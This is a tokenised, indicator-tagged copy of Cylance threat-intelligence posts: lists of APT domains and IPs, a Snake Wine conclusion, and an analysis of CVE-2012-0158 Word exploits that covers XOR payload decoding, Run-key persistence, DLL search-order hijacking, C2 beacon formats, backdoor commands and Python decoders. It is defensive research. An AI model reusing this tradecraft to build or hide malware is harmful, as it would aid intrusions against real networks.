msn.incloud-go(dot)com  B_url.unknown
sakai.unhamj(dot)com  B_url.unknown
sappore.cloud-maste(dot)com B_url.unknown
sapporo.cloud-maste(dot)com B_url.unknown
scorpion.poulsenv(dot)com B_url.unknown
shrimp.bdoncloud(dot)com  B_url.unknown
sindeali(dot)com  B_url.unknown
style.u-tokyo-ac-jp(dot)com B_url.unknown
trout.belowto(dot)com B_url.unknown
ukuoka.cloud-maste(dot)com  B_url.unknown
v4.windowsupdate.dedgesuite(dot)net B_url.unknown
vmmini(dot)com  B_url.unknown
whale.toshste(dot)com B_url.unknown
windowsupdate.dedgesuite(dot)net  B_url.unknown
windowsupdate.wcwname(dot)com B_url.unknown
www.cloud-maste(dot)com B_url.unknown
www.foal.wchildress(dot)com B_url.unknown
www.fukuoka.cloud-maste(dot)com B_url.unknown
www.incloud-go(dot)com  B_url.unknown
www.kawasaki.cloud-maste(dot)com  B_url.unknown
www.kawasaki.unhamj(dot)com B_url.unknown
www.lion.wchildress(dot)com B_url.unknown
www.msn.incloud-go(dot)com  B_url.unknown
www.sakai.unhamj(dot)com  B_url.unknown
www.sapporo.cloud-maste(dot)com B_url.unknown
www.unhamj(dot)com  B_url.unknown
www.ut-portal-u-tokyo-ac-jp.tyoto-go-jp(dot)com B_url.unknown
www.vmmini(dot)com  B_url.unknown
www.wchildress(dot)com  B_url.unknown
www.yahoo.incloud-go(dot)com  B_url.unknown
yahoo.incloud-go(dot)com  B_url.unknown
zebra.bdoncloud(dot)com B_url.unknown
zebra.incloud-go(dot)com  B_url.unknown
zebra.wthelpdesk(dot)com  B_url.unknown

IP
Addresses
:
107.181.160.109 B_ip.unknown
109.237.108.202 B_ip.unknown
151.101.100.73  B_ip.unknown
151.236.20.16 B_ip.unknown
158.255.208.170 B_ip.unknown
158.255.208.189 B_ip.unknown
158.255.208.61  B_ip.unknown
160.202.163.79  B_ip.unknown
160.202.163.82  B_ip.unknown
160.202.163.90  B_ip.unknown
160.202.163.91  B_ip.unknown
169.239.128.143 B_ip.unknown
185.117.88.81 B_ip.unknown
185.133.40.63 B_ip.unknown
185.141.25.33 B_ip.unknown
211.110.17.209  B_ip.unknown
31.184.198.23 B_ip.unknown
31.184.198.38 B_ip.unknown
92.242.144.2  B_ip.unknown

Anomalous
IP
Crossover

One
of
the
most
perplexing
aspects
of
tracing
the
infrastructure
associated
with
this
particular
campaign
is
that
it
appeared
to
lead
to
a
significant
number
of
well-known
'
MenuPass'/
'
Stone
Panda
'
domains
.

MenuPass
is
a
well-documented
CN-APT
group
,
whose
roots
go
back
to
2009
.

The
group
was
first
publicly
disclosed
by
FireEye
in
this
report
.
However
,
many
of
those
domains
were
inactive
for
as
long
as
two
years
and
could
have
easily
been
re-registered
by
another
entity
looking
to
obfuscate
attribution
.

As
a
result
,
we've
only
included
recent
Dynamic
DNS
domains
that
were
connected
to
recently
registered
infrastructure
.

A
much
larger
collection
of
information
is
available
to
trusted
and
interested
parties
.

Please
contact
us
at
:
deceptionproject
(
at
)
Cylance
[dot]
com
.

Dynamic
DNS
IPs
:
37.235.52.18  B_ip.unknown
2016-05-11
78.153.151.222  B_ip.unknown
2016-05-13
175.126.148.111 B_ip.unknown
2016-07-14
95.183.52.57  B_ip.unknown
2016-07-26
109.237.108.202 B_ip.unknown
2016-12-26
109.248.222.85  B_ip.unknown
2016-12-27

Dynamic
DNS
Domains
:
blaaaaaaaaaaaa.windowsupdate(dot)3-a.net  B_url.unknown
contract.4mydomain(dot)com  B_url.unknown
contractus.qpoe(dot)com B_url.unknown
ctdl.windowsupdate.itsaol(dot)com B_url.unknown
ctldl.microsoftupdate.qhigh(dot)com B_url.unknown
ctldl.windowsupdate.authorizeddns(dot)org B_url.unknown
ctldl.windowsupdate.authorizeddns(dot)us  B_url.unknown
ctldl.windowsupdate.dnset(dot)com B_url.unknown
ctldl.windowsupdate.lflinkup(dot)com  B_url.unknown
ctldl.windowsupdate.x24hr(dot)com B_url.unknown
download.windowsupdate.authorizeddns(dot)org  B_url.unknown
download.windowsupdate.dnset(dot)com  B_url.unknown
download.windowsupdate.itsaol(dot)com B_url.unknown
download.windowsupdate.lflinkup(dot)com B_url.unknown
download.windowsupdate.x24hr(dot)com  B_url.unknown
ea.onmypc(dot)info  B_url.unknown
eu.wha(dot)la B_url.unknown
feed.jungleheart(dot)com  B_url.unknown
fire.mrface(dot)com B_url.unknown
fuck.ikwb(dot)com B_url.unknown
globalnews.wikaba(dot)com B_url.unknown
helpus.ddns(dot)info  B_url.unknown
home.trickip(dot)org  B_url.unknown
imap.dnset(dot)com  B_url.unknown
ipv4.windowsupdate.3-a(dot)net  B_url.unknown
ipv4.windowsupdate.authorizeddns(dot)org  B_url.unknown
ipv4.windowsupdate.dnset(dot)com  B_url.unknown
ipv4.windowsupdate.fartit(dot)com B_url.unknown
ipv4.windowsupdate.lflink(dot)com B_url.unknown
ipv4.windowsupdate.lflinkup(dot)com B_url.unknown
ipv4.windowsupdate.mylftv(dot)com B_url.unknown
ipv4.windowsupdate.x24hr(dot)com  B_url.unknown
latestnews.organiccrap(dot)com  B_url.unknown
microsoftmirror.mrbasic(dot)com B_url.unknown
microsoftmusic.itemdb(dot)com B_url.unknown
microsoftstore.onmypc(dot)net B_url.unknown
microsoftupdate.qhigh(dot)com B_url.unknown
mobile.2waky(dot)com  B_url.unknown
mseupdate.ourhobby(dot)com  B_url.unknown
newsreport.justdied(dot)com B_url.unknown
nmrx.mrbonus(dot)com  B_url.unknown
outlook.otzo(dot)com  B_url.unknown
referred.gr8domain(dot)biz  B_url.unknown
twx.mynumber(dot)org  B_url.unknown
v4.windowsupdate.authorizeddns(dot)org  B_url.unknown
v4.windowsupdate.dnset(dot)com  B_url.unknown
v4.windowsupdate.itsaol(dot)com B_url.unknown
v4.windowsupdate.lflinkup(dot)com B_url.unknown
v4.windowsupdate.x24hr(dot)com  B_url.unknown
visualstudio.authorizeddns(dot)net  B_url.unknown
windowsupdate.2waky(dot)com B_url.unknown
windowsupdate.3-a(dot)net B_url.unknown
windowsupdate.acmetoy(dot)com B_url.unknown
windowsupdate.authorizeddns(dot)net B_url.unknown
windowsupdate.authorizeddns(dot)org B_url.unknown
windowsupdate.dns05(dot)com B_url.unknown
windowsupdate.dnset(dot)com B_url.unknown
windowsupdate.esmtp(dot)biz B_url.unknown
windowsupdate.ezua(dot)com  B_url.unknown
windowsupdate.fartit(dot)com  B_url.unknown
windowsupdate.itsaol(dot)com  B_url.unknown
windowsupdate.lflink(dot)com  B_url.unknown
windowsupdate.mrface(dot)com  B_url.unknown
windowsupdate.mylftv(dot)com  B_url.unknown
windowsupdate.x24hr(dot)com B_url.unknown
www.contractus.qpoe(dot)com B_url.unknown
www.feed.jungleheart(dot)com  B_url.unknown
www.helpus.ddns(dot)info  B_url.unknown
www.latestnews.organiccrap(dot)com  B_url.unknown
www.microsoftmirror.mrbasic(dot)com B_url.unknown
www.microsoftmusic.itemdb(dot)com B_url.unknown
www.microsoftstore.onmypc(dot)net B_url.unknown
www.mobile.2waky(dot)com  B_url.unknown
www.mseupdate.ourhobby(dot)com  B_url.unknown
www.nmrx.mrbonus(dot)com  B_url.unknown
www.twx.mynumber(dot)org  B_url.unknown
www.visualstudio.authorizeddns(dot)net  B_url.unknown
www.windowsupdate.acmetoy(dot)com B_url.unknown
www.windowsupdate.authorizeddns(dot)net B_url.unknown
www.windowsupdate.authorizeddns(dot)org B_url.unknown
www.windowsupdate.dnset(dot)com B_url.unknown
www.windowsupdate.itsaol(dot)com  B_url.unknown
www.windowsupdate.x24hr(dot)com B_url.unknown
www2.qpoe(dot)com B_url.unknown
www2.zyns(dot)com B_url.unknown
www2.zzux(dot)com B_url.unknown

Conclusion

The
Snake
Wine
group
has
proven
to
be
highly
adaptable
and
has
continued
to
adopt
new
tactics
in
order
to
establish
footholds
inside
victim
environments
.

The
exclusive
interest
in

Japanese
government
,
education
,
and
commerce
will
likely
continue
into
the
future
as
the
group
is
just
starting
to
build
and
utilize
their
existing
current
attack
infrastructure
.

If
the
past
is
an
accurate
indicator
,
attacks
will
continue
to
escalate
in
both
skill
and
intensity
as
the
attackers
implement
new
tactics
in
response
to
defenders
acting
on
previously
released
information
.

Perhaps
the
most
interesting
aspect
of
the
Snake
Wine
group
is
the
number
of
techniques
used
to
obscure
attribution
.

Signing
the
malware
with
a
stolen
and
subsequently
publicly
leaked
code-signing
certificate
is
sloppy
even
for
well-known
CN-APT
groups
.

Also
of
particular
interest
from
an
attribution
obfuscation
perspective
is
direct
IP
crossover
with
previous
Dynamic
DNS
domains
associated
with
known
CN-APT
activity
.

A
direct
trail
was
established
over
a
period
of
years
that
would
lead
competent
researchers
to
finger
CN
operators
as
responsible
for
this
new
activity
as
well
.

Although
the
MenuPass
Group
used
mostly
publicly
available
RATs
,
they
were
successful
in
penetrating
a
number
of
high
value
targets
,
so
it
is
entirely
possible
this
is
indeed
a
continuation
of
past
activity
.

However
,
Cylance
does
not
believe
this
scenario
to
be
probable
,
as
a
significant
amount
of
time
has
elapsed
between
the
activity
sets
.

Also
of
particular
interest
was
the
use
of
a
domain
hosting
company
that
accepts
BTC
and
was
previously
heavily
leveraged
by
the
well-known
Russian
group
APT28
.

In
any
case
,
Cylance
hopes
to
better
equip
defenders
to
detect
and
respond
to
active
threats
within
their
network
and
enable
the
broader
security
community
to
respond
to
similar
threats
.

In
terms
of
defending
and
responding
to
malware
,
attribution
is
rarely
important
.

As
new
methodologies
become
more
broadly
detected
,
threat
actors
will
continue
to
embrace
alternate
and
new
strategies
to
continue
achieving
their
objectives
.

Yara
Rules

Yara
rules
for
this
campaign
can
be
found
on
GitHub
here
:
https://github.com/CylanceSPEAR/IOCs/blob/master/snake.wine.yar B_url.normal

If
you
use
our
endpoint
protection
product
,
CylancePROTECT
®
,
you
were
already
protected
from
this
attack
.

If
you
don't
have
CylancePROTECT
,
contact
us
to
learn
how
our
AI
based
solution
can
predict
and
prevent
unknown
and
emerging
threats
.
Cylance
SPEAR
Team
:
A
Threat
Actor
Resurfaces

May
13
,
2015

By
Jon
Gross
(
http://blog.cylance.com/author/jon-gross  B_url.normal
)

Share
This
:

Attackers
typically
shut
down
campaigns
or
halt
activity
after
they
are
exposed
by
security
researchers
,
thereby
creating
the
impression
they
have
dropped
off
the
map
.

This
often
leads
to
a
false
sense
of
security
within
the
community
and
perpetuates
the
idea
that
public
exposure
makes
us
all
safer
.

While
the
exposed
activity
is
no
longer
observed
,
attackers
simply
continue
in
the
background
–
evolving
or
altering
their
tactics
to
seamlessly
continue
operations
with
increasingly
advanced
malware
.

So
while
potentially
making
us
safer
in
the
short-term
,
exposure
often
forces
a
Darwinian
evolution
in
malware
.

Several
months
ago
I
examined
a
malware-tainted
Word
document
titled
'
ISIS_twitter_list.doc
.

'
I
didn't
think
much
of
it
and
quickly
moved
on
after
a
cursory
analysis
.

Yet
I
recently
uncovered
evidence
that
suggests
it
was
the
work
of
a
well-known
Chinese
threat
group
.

This
group
is
known
to
have
targeted
U.S.
government
agencies
,
defense
contractors
,
aerospace
firms
and
foreign
militaries
since
2009
.

Until
now
,
it
was
widely
believed
the
actor's
activities
had
largely
subsided
in
2013
,
following
numerous
public
disclosures
and
detailed
analyses
of
their
backdoors
.

Our
technical
analysis
shows
the
group
has
remained
active
.

We
are
releasing
this
data
to
help
victims
identify
and
remediate
the
threat
.

Click
here
(
http://blog.cylance.com/spear-a-threat-actorresurfaces#mitigation B_url.normal
)
to
get
to
recommended
mitigations
,
or
for
all
the
technical
details
read
on
:

It
all
began
with
the
MIME
encoded
document
'
ISIS_twitter_list.doc
'
,
which
exploited
the
familiar
CVE-2012-0158 B_malware.backdoor
(
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158 B_url.normal
)
and
was
first
uploaded
to
Virustotal
from
a
user
in
India
.

Other
targets
identified
were
predominantly
located
in
Australia
,
New
Zealand
,
Vietnam
and
the
United
States
.

File
Details

ISIS_twitter_list.doc
6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40  B_hash
146,338
bytes

Name

SHA256

File
Size

The
first
stage
shellcode
searches
for
the
marker
'
GfCv
'
then
checks
the
next
four
bytes
are
'
EF
FE
EC
CE
'
in
the
document
then
decodes
the
second
stage
shellcode
using
the
four-byte
XOR
key
'
0x29F7C592
'
.

This
second
stage
finds
and
decodes
an
encoded
executable
beginning
at
offset
0x33A2
.

The
binary
is
encoded
using
a
variable
4-byte
XOR
key
that
is
generated
by
starting
with
the
4-byte
key
0x7FFEFC00;
this
XOR
key
is
then
permutated
every
four
bytes
by
rotating
the
first
two
bytes
of
the
key
by
0x1
and
shifting
the
bits
of
the
next
two
bytes
right
by
0x1
,
so
the
next
4-byte
XOR
key
in
the
series
would
be
0x3FFF7E00
.

It
includes
some
logic
to
exclude
XOR'ng
any
bytes
that
match
0x00000000
or
the
current
4byte
XOR
key
.

For
the
binary
mathematically
impaired
like
myself
the
4-byte
keys
will
eventually
repeat
in
effect
creating
a
256-byte
XOR
key
.

The
decoded
binary
will
be
written
to
the
filesystem
as
'
%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx
'
.

File
Details

Full
File
Path

SHA256

File
Size

Compile
Time
%APPDATA%\Microsoft\Systemcertificates\Certificates.ocx
9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165  B_hash
107,008
bytes
2/4/2015
8:41:42
UTC

The
malware
does
not
execute
immediately
after
successful
exploitation
and
instead
just
creates
a
Run
key
in
the
current
user's
hive
which
will
execute
the
next
time
the
victim
user
accesses
the
system
.

Registry
Persistence
Key

Registry
Key
Value

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates

Rundll32.exe
'
%APPDATA%\Microsoft\SystemCertificates\Certificates.ocx',Setup

The
ocx
file
is
actually
a
DLL
and
provides
the
attacker
the
ability
to
upload
,
download
,
enumerate
,
delete
,
search
,
and
execute
files
as
well
as
list
drivers
on
the
system
.

The
binary
is
designed
to
be
called
from
its
one
exported
function
,
'
Setup';
the
Run
key
will
ensure
that
whenever
the
victim
user
logs
into
the
system
the
backdoor
will
execute
.

The
binary
is
configured
to
communicate
to
'
www.microsoftservices.proxydns.com  B_url.unknown
'
on
port
80
using
standard
HTTP
POST
and
GET
requests
.

The
domain
at
the
time
of
this
report
resolved
to
the
IP
address
,
'
103.229.125.157 B_ip.unknown
'
.

Additionally
the
dynamic
DNS
domains
'
fighthard.mooo.com  B_url.unknown
'
and
'
rampage.freetcp.com B_url.unknown
'
have
both
historically
resolved
to
this
IP
address
.

Example
initial
beacon
request
:

GET
/login?wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-

H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUHnofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==

HTTP/1.1

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
7.0;
Windows
NT
5.1;
Trident/4.0;
.NET
CLR
2.0.50727;
.NET
CLR
3.0.4506.2152;
.NET
CLR
3.5.30729;
.NET
CLR
1.1.4322
)

Host
:
www.microsoftservices.proxydns.com  B_url.unknown

Cache-Control
:
no-cache

The
above
beacon
request
can
be
decoded
by
base64
decoding
with
this
alphabet
,
'
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
'
.
Then
RC4
decrypting
the
resulting
string
using
the
first
four
bytes
of
the
payload
as
the
decryption
key
.

The
following
python
script
will
make
this
easy
:
from
Crypto.Cipher
import
ARC4
import
base64,binascii,string
def
customb64decode(s
)
:
newalphabet
=
'
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
'
oldalphabet
=
string.uppercase
+
string.lowercase
+
string.digits
+
'
+/
'
s
=
s.translate(string.maketrans(newalphabet
,
oldalphabet
)
)
return
base64.b64decode(s
)
req
=
'
hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-

H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUHnofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==
'
unb64
=
customb64decode(req
)
rc4
=
ARC4.new(unb64[0:4]
)
dec
=
rc4.decrypt(unb64[4::]
)
print
dec

Decoding
the
string
will
yield
the
following
:
k:9C18CDFE
s:masst
h:<HOSTNAME>
u:<USERNAME>
o:win32.5.1.2600.2.1.Service
Pack
3
m:<MAC
ADDRESS>

Where
k
:
is
a
unique
identifier
for
the
victim
,
s
:
is
a
campaign
identifier
included
in
the
backdoor
,
h
:
is
the
hostname
of
the
victim
computer
,
u
:
is
the
victim
user
,
o
:
is
the
operating
system
and
service
pack
level
,
and
m
is
the
mac
address
.

Based
upon
some
cursory
analysis
the
backdoor
will
look
for
encrypted
commands
within
HTML
comments
returned
from
the
C2
using
the
following
format
:
'
<!­­?*$@COMMAND
GOES
HERE@$*?­­!>;
'
however
,
the
C2
was
not
active
at
the
time
of
analysis
so
this
could
not
be
confirmed
.

The
backdoor
may
also
make
requests
to
the
C2
over
HTTP
using
the
following
parameters
in
the
URI
string
'
query?sid=
'
and
'
result
?
sid=
'
.

The
PDB
path
,
C:\Codes\Eoehttp\Release\Eoehttp.pdb
,
was
also
left
in
the
backdoor
although
no
other
instances
of
this
path
could
be
identified
.

Several
additional
exploit
documents
were
identified
by
investigating
the
domains
'
fighthard.mooo.com  B_url.unknown
'
and
'
rampage.freetcp.com B_url.unknown
'
.

Down
the
Intelligence
Rabbit
Hole

Fighthard.mooo.com  B_url.unknown
additionally
resolved
to
173.224.214.12  B_ip.unknown
in
February
of
2014
.

The
following
exploit
documents
were
identified
to
contain
a
payload
which
communicated
to
this
domain
:

Naval
Science
Curriculum
2014.doc
1.doc

Republic
Day
speech
27
Jan
2014.doc
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c  B_hash
c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd  B_hash
3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911  B_hash

Rampage.freetcp.com B_url.unknown
still
resolves
to
103.229.125.157 B_ip.unknown
as
of
4/2/2015

Let's
go
ahead
and
take
a
look
further
into
one
of
the
other
expoit
documents
,
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c  B_hash
.

SHA256

Name

File
Size
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c  B_hash

Naval
Science
Curriculum
2014.doc
459,087

The
document
exploits
old
faithful
,
CVE-2012-0158 B_malware.backdoor
(
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158 B_url.normal
)
,
but
instead
of
using
a
MIME
encoded
document
this
file
was
just
a
plain
RTX
document
.

Yes
that's
not
a
misspelling
Word
is
happy
to
open
this
RTF
format
as
well
.

So
for
anyone
exploring
and
hunting
RTF
documents
you
may
also
want
to
start
looking
for
the
'
{\rtx
'
header
.
We'll
skip
the
shellcode
analysis
for
now
and
go
directly
to
the
binary
which
is
stored
beginning
at
offset
0x1BC27
as
an
ASCII
hex-encoded
,
xor-encoded
binary
.

It
can
be
decoded
using
the
XOR
key
'
0xBF
'
.

Upon
successful
exploitation
the
decoded
binary
will
be
written
first
to
%TEMP%\dw20.EXE
then
copied
to
%WINDIR%\msascm32.drv
.

No
other
changes
are
made
to
the
system
.

File
Details

Full
File
Path
:

SHA256
:

File
Size
:

Compile
Time
:
%WINDIR%\msacm32.drv
67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3  B_hash
108,544
Bytes
9/26/2013
01:46:23
UTC

I'm
always
curious
when
no
registry
changes
are
made
in
the
exploitation
process
.

At
first
the
backdoor
failed
to
load
or
really
do
anything
in
my
VM
until
I
read
what
the
'
msascm32.drv
'
file
does
.

Looking
at
the
original
file's
(
%WINDIR%\system32\msacm32.drv
)
imported
functions
,
it's
clear
the
DLL
is
responsible
for
some
type
of
audio
processing
and
/
or
playback
.

A
quick
search
on
the
internet
confirmed
this
so
I
added
a
soundcard
to
my
VM
.

On
reboot
explorer.exe
was
now
happy
to
load
the
backdoor
and
get
down
to
business
;
this
technique
is
known
as
dll
search
order
hijacking
or
binary
planting
.

Interestingly
the
backdoor
will
also
load
the
legitimate
system32\msacm32.drv
file
resolve
functions
and
pass
calls
to
it
so
it
doesn't
break
audio
playback
on
the
victim
system
.

The
backdoor
contains
identical
exports
as
well
as
an
additional
dummy
function
from
the
legitimate
msacm32.drv
called
'
StartWork
'
which
can
be
used
to
reliably
identify
similar
samples
.

The
backdoor
routine
exists
inside
the
DllMain
function
so
when
explorer.exe
loads
the
backdoor
via
LoadLibrary
it
will
begin
spawning
malicious
threads
.

A
PDB
path
was
also
left
in
this
binary
C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb;
A
quick
google
search
will
lead
you
to
a
YARA
rule
written
by
Patrick
Olsen
and
the
very
similar
sample
869fa4dfdbabfabe87d334f85ddda234  B_hash
which
communicates
to
www.micro1.zyns.com B_url.unknown
on
TCP
port
80
.

The
two
files
also
have
an
identical
compilation
time
,
which
suggests
the
backdoor
is
probably
not
recompiled
very
often
and
instead
the
attacker
simply
updates
the
callback
configuration
information
.

The
backdoor
interestingly
contains
the
well
known
Poison
Ivy
RAT
shellcode
as
well
as
its
own
custom
backdoor
.

It
will
first
attempt
to
communicate
to
fighthard.mooo.com  B_url.unknown
using
the
poison
ivy
binary
protocol
with
the
default
connection
password
of
'
admin
'
.

The
Poison
Ivy
shellcode
is
encrypted
using
a
custom
cipher
with
the
key
'
Tiger324
{
'
beginning
at
offset
0xFA5
and
ending
at
0x159E
.

If
this
initial
connection
fails
it
will
revert
to
the
secondary
backdoor
,
which
utilizes
HTTP
GET
and
POST
requests
somewhat
similar
to
the
ones
described
above
to
the
internal
IP
address
'
192.168.2.26  B_ip.unknown
'
.

This
suggested
the
attacker
had
already
compromised
other
systems
in
the
environment
and
was
using
an
internal
C2
mechanism
for
a
fallback
.

Example
Internal
Beacon
:

GET
/login.asp
?
p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX

EJ7OZkvwBZVx1JsrhQ==
HTTP/1.1

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
8.0;
Win32
)

Host
:
192.168.2.26  B_ip.unknown

Requests
may
also
be
made
to
the
following
pages
:
'
check.asp
'
,
'
result.asp
'
,
and
'
upload.asp
'
.

The
request
structure
is
slightly
different
in
that
it
uses
the
base64
alphabet
'
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*
'
.

The
resulting
request
can
be
decoded
further
by
using
the
first
16
bytes
of
the
result
as
an
XOR
key
to
decode
the
rest
of
the
payload
.

It
also
uses
a
static
User-Agent
string
of
'
Mozilla/4.0
(
compatible;
MSIE
8.0;
Win32
)
'
for
each
request
.

The
following
script
simplifies
this
process
:
def
rolling_xor(buf
,
key
)
:
out
=
'
'
k
=
0
for
i
in
buf
:
if
k
==
len(key
)
:
k
=
0
out
+=
chr(ord(i
)
^
ord(key[k]
)
)
k
+=
1
return
out
req
=
'
p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I

XEJ7OZkvwBZVx1JsrhQ==
'
unb64
=
base64.b64decode(req,'+*
'
)
dec
=
rolling_xor(unb64[16::],unb64[0:16]
)
print
dec

The
request
decodes
to
'
123|000000+|USER-D6921F6215|Administrator|-1676096002|1.0|0|
'
,
where
values
are
separated
by
the
delimiter
'
|
'
.
'
123
'
is
a
campaign
identifier
hard
coded
into
the
backdoor
.

I
don't
know
what
'
000000+
'
is
but
it's
also
a
hard
coded
value
;
my
best
guess
is
it's
to
modify
the
timezone
of
the
timestamp
.
'
USER-D6921F6215
'
is
the
hostname
of
the
victim
,
'
Administrator
'
is
the
victim
user
,
'
1676096002
'
is
the
current
Date
/
Time
in
decimal
,
and
'
1.0
'
is
a
version
number
also
stored
in
the
backdoor
.

The
16-byte
XOR
key
will
be
randomly
generated
per
each
request
.

Results
from
commands
will
be
sent
back
encoded
to
the
server
to
the
'
result.asp
'
page
.

The
backdoor
will
accept
the
following
commands
:
#runhfcore-
starts
the
main
PI
backdoor
functionality
in
a
separate
thread
#getdrivelist
?
-
enumerates
logical
drives
on
the
system
#getfilelist
?
-
enumerates
logical
files
using
FindFirst
FindNext
technique
#delfile-
deletes
a
file
using
the
DeleteFileA
API
#newupload
?
-
uploads
a
file
#newdownload
?
-
downloads
a
file
#runfile-
-
executes
a
file
on
the
system
via
CreateProcess
API
#urldownload
?
-
will
download
a
file
from
a
remote
URL
using
InternetOpen
and
InternetReadFile
#sleep
?
-
Sleeps
for
a
specified
number
of
minutes
#delay
?
-
exact
functionality
unknown
appears
to
force
another
request
to
the
C2
page
check.asp
#maxblock
?
-
exact
functionality
unknown
appears
to
force
another
request
to
the
C2
page
check.asp
#stop
!
-
exact
functionality
unknown
appears
to
force
another
request
to
the
C2
page
check.asp

Commands
with
a
?
appear
to
take
an
additional
parameter
while
files
that
end
in
-
require
a
full
file
path
.

The
backdoor
is
also
capable
of
elevating
its
privileges
on
win7
and
above
using
a
method
similar
to
the
one
described
here
:
http://www.pretentiousname.com/misc/win7_uac_whitelist2.html  B_url.unknown
.

I
thought
it
was
interesting
the
backdoor
used
a
secondary
backup
backdoor
in
addition
to
its
primary
payload
.

The
first
communicated
directly
outside
the
network
using
a
well
known
RAT
protocol
and
if
that
failed
the
secondary
much
stealthier
backdoor
communicated
to
an
internal
C2
address
using
it's
own
custom
encoded
HTTP
based
protocol
.

The
use
of
a
relatively
undisclosed
DLL
search
order
hijack
also
made
this
sample
unique
.

Detection
rates
for
this
binary
seem
to
be
pretty
good
right
now
39
/
57
;
however
,
at
the
time
it
was
first
used
in
late
January
2014
detection
rates
were
much
poorer
.

Other
samples
from
the
identified
exploit
documents
were
similar
to
the
one
described
above
with
different
network
callbacks
.

And
now
to
tie
all
this
back
to
the
'
well-known
'
threat
group
.
The
'
173.224.214.12  B_ip.unknown
'
IP
address
that
'
fighthard.mooo.com  B_url.unknown
'
previously
resolved
to
also
historically
had
two
other
domains
point
to
it
'
queenberry.www1.biz B_url.unknown
'
and
'
word.crabdance.com  B_url.unknown
'
.

'
word.crabdance.com  B_url.unknown
'
previously
resolved
to
'
64.71.162.70  B_ip.unknown
'
on
September
8
,
2012
and
108.171.246.140 B_ip.unknown
on
February
19
,
2014
.

The
'
64.71.162.70  B_ip.unknown
'
address
and
the
associated
domain
'
www.ollay011.zyns.com B_url.unknown
'
are
rather
infamous
and
the
first
mention
of
it

I
could
find
is
in
this
shadowserver
post
:
http://blog.shadowserver.org/2012/04/16/beware-of-what-youdownload-recent-purported-ceiec-document-dump-booby-trapped/  B_url.unknown
related
to
exploit
documents
identified
in
a
data
dump
from
Hardcore
Charlie
.

If
you
follow
the
rabbit
hole
deep
enough
you
can
eventually
trace
samples
via
domain
and
IP
address
crossover
back
to
the
FBI
flash
#A-000009-MW
from
mid
2013
.

Additional
domains
and
IP
addresses
related
to
this
group
are
included
in
the
appendix
.

Mitigation

While
defending
against
the
constant
stream
of
new
malware
from
advanced
threat
groups
may
be
difficult
,
organizations
can
take
some
relatively
easy
steps
to
help
identify
intrusions
.

This
group
is
among
the
numerous
threat
actors
who
rely
almost
exclusively
on
Dynamic
DNS
infrastructure
.

They
seem
to
prefer

ChangeIP
(
https://www.changeip.com/services/free-dynamic-dns/(https://www.changeip.com/services/freedynamic-dns/  B_url.unknown
)
)
and
Afraid
(
https://freedns.afraid.org/
(
https://freedns.afraid.org/ B_url.unknown
)
)
for
free
DNS
services
,
although
they
previously
heavily
used
Sitelutions
(
https://sitelutions.com/info/sldns(https://sitelutions.com/info/sldns B_url.unknown
)
)
.

While
there
are
some
legitimate
instances
of
dynamic
DNS
in
corporate
environments
,
it
only
accounts
for
a
small
percentage
of
traffic
.

Monitoring
and
/
or
blocking
dynamic
DNS
requests
should
help
detect
attacks
by
this
actor
.

Any
dynamic

DNS
domains
that
resolve
to
non-routable
IP
addresses
,
like
127.0.0.1 B_ip.unknown
or
private
IP
addresses
,
should
be
thoroughly
investigated
.

The
HTTP
traffic
generated
by
both
samples
uses
a
limited
number
of
header
fields
,
which
is
substantially
different
from
the
majority
of
traffic
generated
by
modern
browsers
.

As
always
,
don't
open
E-mail
attachments
from
untrusted
parties
.

APPENDIX  B_url.unknown
A I
:
Associated
IP
Addresses
and
Domains
103.229.125.157 B_ip.unknown
microsoftservices.proxydns.com  B_url.unknown
-
current
rampage.freetcp.com B_url.unknown
-
current
fighthard.mooo.com  B_url.unknown
-
9/8/2014
103.238.227.69  B_ip.unknown
www.micro.zyns.com  B_url.unknown
-
current
computer001.dumb1.com B_url.unknown
-
current
microlab.dns04.com  B_url.unknown
-
current
173.224.214.12  B_ip.unknown
word.crabdance.com  B_url.unknown
-
11/12/2012
fighhard.mooo.com B_url.unknown
-
1/31/2014
queenberry.www1.biz B_url.unknown
-
2/14/2014
162.251.122.216 B_ip.unknown
fighthard.mooo.com  B_url.unknown
-
5/20/2014
121.127.249.97  B_ip.unknown
queenberry.www1.biz B_url.unknown
-
10/1/2014
anhtuan88.ns01.biz  B_url.unknown
anhphuong85.www1.biz  B_url.unknown
64.71.162.70  B_ip.unknown
word.crabdance.com  B_url.unknown
-
9/8/2012
www.fornobody.dns04.com B_url.unknown
